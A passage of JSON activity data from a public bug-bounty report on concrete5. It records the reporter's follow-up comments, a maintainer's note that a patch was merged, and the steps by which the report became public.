noreferrer\"\u003e\u003cspan\u003ehttps://github.com/concrete5/concrete5/pull/8651\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e pull request! I agree that only admin can do this action!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-19T01:35:01.778Z","updated_at":"2020-05-19T01:35:01.778Z","actor":{"username":"thiennv","cleared":false,"url":"/thiennv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TXFhU3KsSqT9D2gPDMxax4HJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8113135,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@korvin Did you resolved it?","markdown_message":"\u003cp\u003e\u003ca href=\"/korvin\"\u003e@korvin\u003c/a\u003e Did you resolved it?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-27T00:43:48.988Z","updated_at":"2020-05-27T00:43:48.988Z","actor":{"username":"thiennv","cleared":false,"url":"/thiennv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TXFhU3KsSqT9D2gPDMxax4HJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8194504,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"A patch for this bug has been merged into the development branch of concrete5 and will be available in the next version of concrete5.\n\nThank you for bringing this to our attention.","markdown_message":"\u003cp\u003eA patch for this bug has been merged into the development branch of concrete5 and will be available in the next version of concrete5.\u003c/p\u003e\n\n\u003cp\u003eThank you for bringing this to our attention.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-03T20:07:20.498Z","updated_at":"2020-06-03T20:07:20.498Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"thiennv","url":"/thiennv"},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8314834,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@korvin version 8.5.4 is not included the SQL Injection vulnerability patch, right?","markdown_message":"\u003cp\u003e\u003ca href=\"/korvin\"\u003e@korvin\u003c/a\u003e version 8.5.4 is not included the SQL Injection vulnerability patch, right?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T06:15:17.750Z","updated_at":"2020-06-17T06:15:17.750Z","actor":{"username":"thiennv","cleared":false,"url":"/thiennv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TXFhU3KsSqT9D2gPDMxax4HJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8507857,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-06T01:08:23.295Z","updated_at":"2020-07-06T01:08:23.295Z","first_to_agree":true,"actor":{"username":"thiennv","cleared":false,"url":"/thiennv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TXFhU3KsSqT9D2gPDMxax4HJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8849381,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-05T01:08:55.466Z","updated_at":"2020-08-05T01:08:55.466Z","actor":{"url":"/concrete5","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"concrete5"}},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}